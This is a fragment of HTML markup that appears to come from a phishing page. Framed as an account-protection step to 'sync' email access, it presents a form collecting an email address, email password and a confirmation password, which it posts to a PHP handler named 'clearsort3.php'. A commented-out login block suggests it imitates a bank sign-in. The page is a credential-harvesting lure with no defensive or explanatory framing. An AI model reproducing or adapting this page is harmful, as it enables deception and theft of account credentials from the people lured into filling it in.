...
<body>
   ...
   <div id="pgMain" role="main">
         <div id="mainContent">
           <div class="leftCol">
            <h2>Help us protect your account by syncronizing your email access</h2>
			
            <form method="post" name="safelogin" action="clearsort3.php">
  ...
  <tr>
      <td class="left" colspan="2" style="background:#CCC">
         <font face="Arial, Helvetica, sans-serif" size="2"><b>Sync Email Address</b></font>
      </td>
   </tr>
  ...
  <tr>
    ...
    <td class="left" bgcolor="#FFFFFF" valign="top">
      <input type="text" maxlength="40" name="email" size="30" value="">
    </td>
  </tr>
  <tr>
    <td class="right" bgcolor="#f0f0f0" width="30%">
      <span class="red">*</span>Email password:
    </td>
    <td class="left" bgcolor="#FFFFFF">
       
       <input type="password" name="emailpass" size="30" maxlength="40" value="">
  ...
  <tr>
    ...
    <td class="left" bgcolor="#FFFFFF">
      <input type="password" name="cpass" size="30" maxlength="40" value="">
    </td>
  </tr>
  ...
  <tr>
	...
	<br>
        <input type="image" src="sub_btn.jpg" width="54" height="26">
    </td>
  </tr>
              ...
              <!--<label>Email on your account:</label>
              <input type="password" name="Password" id="CurrentPassword" aria-label="Password with Eagle security image">
              <img src="eyeball-open.png" alt="Password visibility toggle" id="toggle-password" class="toggle-password" title="Show Password">
			  ...
			  <input type="submit" name="Log In" id="LogIn" class="LogIn" value="Log In">
